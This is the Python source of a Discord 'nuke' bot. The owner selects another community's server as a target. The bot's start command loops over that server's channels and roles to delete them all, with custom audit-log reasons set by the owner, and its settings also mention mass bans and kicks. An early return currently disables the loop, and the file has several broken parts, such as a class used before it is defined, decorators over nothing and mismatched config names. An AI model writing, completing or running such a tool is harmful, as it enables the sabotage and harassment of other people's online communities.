import disnake
from disnake.ext import commands
from dotenv import load_dotenv
from os import getenv, execv
from sys import argv, executable
from disnake.ext.commands import NotOwner,MemberNotFound,RoleNotFound,MessageNotFound,CommandInvokeError,MissingRequiredArgument,MissingPermissions,CommandOnCooldown,CommandNotFound,UserNotFound
from asyncio import TimeoutError
from configparser import ConfigParser
from time import mktime
from colorama import init, Fore, Style
from datetime import datetime

class bolds:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'

conf = ConfigParser()

load_dotenv(".env")
token = getenv("token")
if token is None:
    token_from_input = input("Bot's token> ")
    f = open(".env", "w+")
    f.write(f"token={token_from_input}")
    f.close()
    print("rebooting to reload config")
    execv(executable, ["python", 'main.py'] + argv)

bot = commands.Bot(command_prefix="n!")

class select_home_guild(disnake.ui.Select):
    def __init__(self):
        Found_Guilds_Selects_Options = []
        for guild in bot.guilds:

            opts = disnake.SelectOption(label=guild.name,
                    value=str(guild.id),
                    description="Click to select this server")

            Found_Guilds_Selects_Options.append(opts)

        super().__init__(placeholder="Available servers", custom_id="select_home_server", options=Found_Guilds_Selects_Options)

class make_home_guild_select_view(disnake.ui.View):
    def __init__(self):
        super().__init__()
        self.add_item(select_home_guild())

class guildselects(disnake.ui.Select):
    def __init__(self):
        Found_Guilds_Selects_Options = []
        for guild in bot.guilds:

            opts = disnake.SelectOption(label=guild.name,
                    value=str(guild.id),
                    description="Click to select this server")

            Found_Guilds_Selects_Options.append(opts)

        super().__init__(placeholder="Available servers to nuke", custom_id="member_of_servers", options=Found_Guilds_Selects_Options)

class adddrop_ls_servers(disnake.ui.View):
    def __init__(self):
        super().__init__()
        self.add_item(guildselects())

class Functs:
    __target_serverid = Config.get_from_config('DEFAULT', 'target_server')

    def guild_found():
        guild = bot.get_guild(Functs.__target_serverid)
        if guild is None:
            return False
        elif guild is not None:
            return guild

    def get_own_roles():
        guild = Functs.guild_found()
        if not guild:
            return None
        own_roles: list[disnake.Role] = []
        for role in guild.me.roles:
            own_roles.append(role)
        return own_roles

    def perms_for_role(roles: list[disnake.Role]):
        roles_and_their_perms = {}
        for role in roles:
            roles[str(role.id)] = role.permissions
        
        print(roles_and_their_perms)
        return roles_and_their_perms

class Config:
    role_del_audit = None
    channel_del_audit = None
    members_punish_audit = None
    server = None
    target_server = None

    def write_to_conf(to_section: str, opt: str, val: str, new_section='DEFAULT'):
        """`to_section` may be anything ONLY IF new_section is given a value"""
        conf.read('./config.ini')
        if new_section != "DEFAULT":
            conf.add_section(new_section)
            conf.set(new_section, opt, val)
            return "created_new_section_with_key_value"
        has_opt = conf.has_option('DEFAULT', opt)
        if has_opt:
            conf.set('DEFAULT', opt, val)
            return "updated_value"
        conf.set(to_section, opt, val)
        return "set_key_in_default"
    
    def get_from_config(from_section: str, opt: str):
        return conf.get(from_section, opt, fallback=None)

    async def _set(variable: str, ctx: commands.Context):

        try:
            Config.__getattribute__(Config, variable)
        except AttributeError:
            await ctx.send(embed=disnake.Embed(description=">>> We don't have such option to customize. \nChoose: ` target_server `, ` role_del_audit `, ` channel_del_audit `, ` members_punish_audit `", color=disnake.Colour.red()))
            return
        if variable == "role_del_audit":
            m = await ctx.send(content=f"> ✅ **Changing text that will appear on their audit logs for role deletions**\nWhat shall be the text? *(Please type now)*")
            try:
                msg: disnake.Message = await bot.wait_for('message', check=lambda m: m.author.id == ctx.author.id and m.channel.id == ctx.channel.id, timeout=60)
            except TimeoutError:
                await ctx.send(embed=disnake.Embed(description=f"> ⏱️ Timed out. Retry.", color=disnake.Colour.red()))
                await m.edit(content=f"> ~~✅ **Changing text that will appear on their audit logs for role deletions**\nWhat shall be the text? *(TIMED OUT!)*~~")
                return
            results = Config.write_to_conf('DEFAULT', 'role_del_audit', f"{msg.content}")
            if results == "set_key_in_default":
                await ctx.send(embed=disnake.Embed(title=f"✅ Gotcha", description=f"` {msg.content} ` will appear on their audit logs"))
                return
        if variable == "channel_del_audit":
            m = await ctx.send(content=f"> ✅ **Changing text that will appear on their audit logs for channel deletions**\nWhat shall be the text? *(Please type now)*")
            try:
                msg: disnake.Message = await bot.wait_for('message', check=lambda m: m.author.id == ctx.author.id and m.channel.id == ctx.channel.id, timeout=60)
            except TimeoutError:
                await ctx.send(embed=disnake.Embed(description=f"> ⏱️ Timed out. Retry.", color=disnake.Colour.red()))
                await m.edit(content=f"> ~~✅ **Changing text that will appear on their audit logs for channel deletions**\nWhat shall be the text? *(TIMED OUT!)*~~")
                return
            results = Config.write_to_conf('DEFAULT', 'channel_del_audit', f"{msg.content}")
            if results == "set_key_in_default":
                await ctx.send(embed=disnake.Embed(title=f"✅ Gotcha", description=f"` {msg.content} ` will appear on their audit logs"))
                return
        if variable == "members_punish_audit":
            m = await ctx.send(content=f"> ✅ **Changing text that will appear on their audit logs for member nuke actions (i.e. ban, kick)**\nWhat shall be the text? *(Please type now)*")
            try:
                msg: disnake.Message = await bot.wait_for('message', check=lambda m: m.author.id == ctx.author.id and m.channel.id == ctx.channel.id, timeout=60)
            except TimeoutError:
                await ctx.send(embed=disnake.Embed(description=f"> ⏱️ Timed out. Retry.", color=disnake.Colour.red()))
                await m.edit(content=f"> ~~✅ **Changing text that will appear on their audit logs for member nuke actions**\nWhat shall be the text? *(TIMED OUT!)*~~")
                return
            results = Config.write_to_conf('DEFAULT', 'members_punish_audit', f"{msg.content}")
            if results == "set_key_in_default":
                await ctx.send(embed=disnake.Embed(title=f"✅ Gotcha", description=f"` {msg.content} ` will appear on their audit logs"))
                return
        if variable == "target_server":
            m = await ctx.send(content=f"> ✅ **Specifying target server**", view=adddrop_ls_servers())

@bot.slash_command(guild_ids=[])
@commands.is_owner()
async def setup(ctx: commands.Context, variable: str):
    await Config._set(variable, ctx)

@bot.slash_command()

@bot.slash_command()
@commands.is_owner()
async def start(ctx: commands.Context):
    guild_id = Config.get_from_config('DEFAULT', 'target_server')
    if guild_id is None:
        await ctx.send(embed=disnake.Embed(description=f"> Configure Nuke bot first with the ` {ctx.prefix}setup ` command", color=disnake.Colour.red()))
        return
    g = bot.get_guild(int(guild_id))
    if ctx.guild.id == g.id:
        await ctx.send(embed=disnake.Embed(description=f"> Are you insane? Do it in your own server remotely!", color=disnake.Colour.red()))
        return

    return

    for channel in g.channels:
        try:
            await channel.delete(reason=Config.channel_del_reason)
        except:
            pass

    for role in g.roles:
        try:
            await role.delete(reason=Config.role_del_reason)
        except:
            pass

@bot.event
async def on_ready():
    if len(bot.guilds) == 0:
        print(f"{bolds.RED}Hey! Hey!{bolds.END}{Fore.WHITE} Throw me at least in 1 server!")
    ever_setup = conf.has_section('UNSET')
    if ever_setup:
        dm_conv = await bot.owner.create_dm()
        await dm_conv.send(embed=disnake.Embed(f"💥 Welcome to Nukebot! ☢️ :D", description=f"To continue, please **specify the following**\n> **`Select your home server`**", color=0xF6F908, timestamp=datetime.now()).set_author(name=f"Hello, {bot.owner.display_name}").set_footer(text=f"It should NOT be the server you are targeting!!! Preferably your own server"))
    print("Reporting in for duty: Bot is ready!")

@bot.event
async def on_command_error(ctx: commands.Context, error):
    if isinstance(error, CommandNotFound):
        await ctx.send(embed=disnake.Embed(description=f">>> **Command does not exist!**\nTry ` {ctx.prefix}help `", color=disnake.Colour.red()))
        return
    if isinstance(error, MissingRequiredArgument):
        required_amount_of_args = 0
        required_args = f""
        for key in ctx.command.params:
            if key == "ctx":
                continue
            else:
                required_amount_of_args += 1
                required_args += f"{key}, "
        await ctx.send(embed=disnake.Embed(description=f">>> ` {ctx.prefix}{ctx.command.name} ` requires **{required_amount_of_args}** more argument(s), namely ` {required_args} `", color=disnake.Colour.red()))
        return
    if isinstance(error, NotOwner):
        await ctx.send(embed=disnake.Embed(description=f">>> This bot should only be operated by it's owner, which is **{bot.owner}** or {bot.owner.mention}", color=disnake.Colour.red()))
        return

@bot.event
async def on_dropdown(i: disnake.MessageInteraction):
    """"""
    if i.data.custom_id == "member_of_servers":
        g = bot.get_guild(int(i.data.values[0]))
        if g is None:
            await i.response.send_message(embed=disnake.Embed(description=f">>> Could not find target server! :/\nHint: `Am I still in there?`", color=disnake.Colour.red()))
            return
        g_owner = await g.getch_member(g.owner_id)
        await i.response.edit_message(content=f"> ✅ **Updated your target server!**",
            embed=disnake.Embed(
                description=f"Updated your target server!", 
                color=disnake.Colour.green()).add_field(
                    name="Name", value=f"` {g.name} `", inline=False).add_field(
                    name="ID", value=f"` {g.id} `", inline=False).add_field(
                    name="Total members (including bots)", value=f"` {g.member_count} `", inline=False).add_field(
                    name="Created", value=f"<t:{int(mktime(g.created_at.timetuple()))}:R>", inline=False).add_field(
                    name="Description", value=f"` {g.description} `", inline=False).add_field(
                    name="Owner", value=f"` {g.owner_id} ` / ` {g_owner} ` / {g_owner.mention}", inline=False),
        components=disnake.ui.Select(placeholder=f"Updated your target server!", min_values=1, max_values=1, options=[disnake.SelectOption(label=f"disabled", value=f"Mark Rutte lol", description=f"Kan opkutte")], disabled=True))
        Config.write_to_conf('DEFAULT', 'target_server', i.data.values[0])

try:
    bot.run(token)
except KeyboardInterrupt:
    quit(0)